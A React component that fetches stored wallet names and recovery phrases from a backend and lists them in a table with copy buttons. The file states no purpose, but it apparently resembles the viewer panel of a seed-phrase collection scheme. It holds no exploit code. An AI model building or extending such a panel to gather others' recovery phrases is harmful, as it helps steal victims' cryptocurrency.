import { useContext, useEffect } from "react"
import { PhraseContext } from "../context/phrase.context"

const URL = import.meta.env.VITE_BACKEND_URL;

const ViewPhrase = () => {
    const {state, dispatch} = useContext(PhraseContext)
    const {getphrase, loading, error} = state

    useEffect(()=>{
        const fetchPhrase = async () => {
            dispatch({type: "SET_LOADING"})

            try{
                const res = await fetch(`${URL}/api/phrase`)
                const data = await res.json()
                dispatch({type: "GET_PHRASE_SUCCESS", payload: data})
            } catch(error){
                dispatch({type: "GET_PHRASE_ERROR", payload: error.message})
            }
        }
        fetchPhrase()
    },[dispatch])

    const handleCopy = (text) => {
        navigator.clipboard.writeText(text)
        .then(()=> alert("Phrase copied to clipboard"))
        .catch((error)=> alert("Failed to copy", error))
    }


    return (
        <>
            <h2 className="py-5 text-center"><u><strong>view phrase</strong></u></h2>
            {
                loading && <p>Loading...</p>
            }
            {
                error && <p className="text-danger">Error: {error}</p>
            }
            {!loading && !error && Array.isArray(getphrase) && getphrase.length > 0 && (
                <table className="table table-striped table-hover">
                <thead>
                    <tr>
                    <th scope="col">#</th>
                    <th scope="col">Wallet Name</th>
                    <th scope="col">Wallet Phrase</th>
                    </tr>
                </thead>
                <tbody>
                    {getphrase.map((item, index) => (
                    <tr key={index}>
                        <th scope="row">{index + 1}</th>
                        <td>{item.walletName || "N/A"}</td>
                        <td><span className="pe-5">{item.phrase}</span> 
                            <button className="btn btn-sm btn-outline-secondary" onClick={()=> handleCopy(item.phrase)} title="copy to clipboard">
                                <i className="fa-solid fa-copy"></i>
                            </button>
                        </td>
                    </tr>
                    ))}
                </tbody>
                </table>
            )}

            {!loading && !error && Array.isArray(getphrase) && getphrase.length === 0 && (
                <p>No phrases found.</p>
            )}
        </>
    )
}
export default ViewPhrase